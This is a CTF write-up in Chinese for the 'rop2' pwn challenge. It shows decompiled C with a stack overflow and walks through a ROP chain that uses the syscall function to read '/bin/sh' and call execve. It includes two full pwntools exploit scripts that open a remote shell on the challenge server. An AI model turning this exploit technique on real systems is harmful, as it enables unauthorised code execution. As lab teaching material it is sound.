NX 有開 。

main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[42]; // [esp+5h] [ebp-33h]

  alarm(0x1Eu);
  strcpy(v4, "Can you solve this?\nGive me your ropchain:");
  syscall(4, 1, v4, 42);
  overflow();
  return 0;
}
```

overflow
```c
int overflow()
{
  char v1; // [esp+Ch] [ebp-Ch]

  syscall(3, 0, &v1, 1024);
  return syscall(4, 1, &v1, 1024);
}
```

overflow 可以算出 offset 16 可以蓋到 ret ， 於是打算讓他跳回 syscall 執行 sys_execve('/bin/sh')
但 ROPgedget 找不出 '/bin/sh' 於是打算自己構造

想法:
第一次進去 overflow 把 ret 蓋掉，換成 syscall(3, 0, buf, 7) --> sys_read(0, buf, 7) ([參考 syscall table](https://syscalls.kernelgrok.com/))

```python
#payload = padding + ret + syscall + arg1 + arg2 + arg3 + arg4
payload = offset + syscall + ret_addr + sys_read
p.sendline(payload)
p.send('/bin/sh')
```

ret 位置給 overflow 讓他可以達成第二次輸入 (原本嘗試直接再跳一次syscall，但失敗了。好像因為 calling convention 的問題，疑問中)
第二次則從 buf 拿自己輸入的 /bin/sh 出來用
```python
payload = offset + syscall + p32(0xdeadbeaf) + sys_execve
```

exp.py
```python
from pwn import *
offset = 'A' * 16
elf = ELF('./rop2')
p = remote('hackme.inndy.tw', 7703)
syscall = p32(elf.plt['syscall'])
ret_addr = p32(elf.symbols['overflow'])
sys_read = p32(0x3) + p32(0x0) + p32(elf.symbols['some_buffer']) + p32(0x7) # syscall(3, fd, buf, count)
sys_execve = p32(0x0b) + p32(elf.symbols['some_buffer']) + p32(0x0) + p32(0x0)
#paylaod = padding + func + ret + args
payload = offset + syscall + ret_addr + sys_read
p.sendlineafter(':', payload)
p.send('/bin/sh')
payload = offset + syscall + p32(0xdeadbeaf) + sys_execve
p.sendlineafter(':', payload)
p.interactive()
```

以下提供一個ROP利用方法 丟參數順序 ebp edi esi ebx

exp.py
```python
from pwn import *
offset = 'A' * 16
elf = ELF('./rop2')
p = remote('hackme.inndy.tw', 7703)
syscall = p32(elf.plt['syscall'])
sys_read = p32(0x3) + p32(0x0) + p32(elf.symbols['some_buffer']) + p32(0x7) # syscall(3, fd, buf, count)
sys_execve = p32(0x0b) + p32(elf.symbols['some_buffer']) + p32(0x0) + p32(0x0)

#paylaod = padding + func + ret + args
payload = offset + syscall + p32(0x08048578) + sys_read
payload += syscall +  p32(0xdeadbeaf) + sys_execve
p.sendlineafter("your ropchain:", payload)
p.sendline("/bin/sh")
p.interactive()
```
